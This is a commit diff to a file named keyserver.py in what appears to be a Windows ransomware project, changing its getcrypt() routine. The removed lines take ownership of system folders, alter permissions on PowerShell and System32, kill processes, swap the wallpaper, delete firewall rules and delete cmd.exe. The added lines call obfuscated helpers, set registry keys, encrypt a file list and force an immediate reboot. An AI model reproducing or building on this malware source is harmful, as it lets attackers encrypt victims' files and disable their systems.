d7ec71c7bc31b09e011f0b6f3257785e9a19c25c
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-11 13:55:08 +0100

    Update keyserver.py

--- modules/network/keyserver.py
+++ modules/network/keyserver.py
@@ -8,21 +8,18 @@ from modules.network import host_connect, sendkey_smtp
 import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes
 
 def getcrypt():
-    takeown.tkOwn_process()
-    takeown.tkOwn_DirWallpaper()
-    takeown.tkOwn_SoftwareDir()
-    icacls.icc_powershell()
-    icacls.icc_sys32()
-    killproc.pkill_smart()
-    icacls.remove_proc()
-    set_wallpaper.copy_img()
+    gt.proc()
+    gr.proc()
+    dk.smart()
+    dr.stsk()
+    rkey.setkey()
+    rkey.delkey()
+    regedit.setInit()
+    gt.dir()
+    gr.dir()
     crypt.filelist()
-    try:
-        set_wallpaper.change_wallpaper()
-    except:
-        pass
-    crypt.filelist_aux()
-    regedit.delSpecRules()
-    regedit.delRules()
-    # Delete cmd.exe last because he used for running the program
-    os.remove("\\windows\\system32\\cmd.exe")
+    dk.exp()
+    time.sleep(1)
+    dr.exp()
+    # REBOOT WINDOWS
+    os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
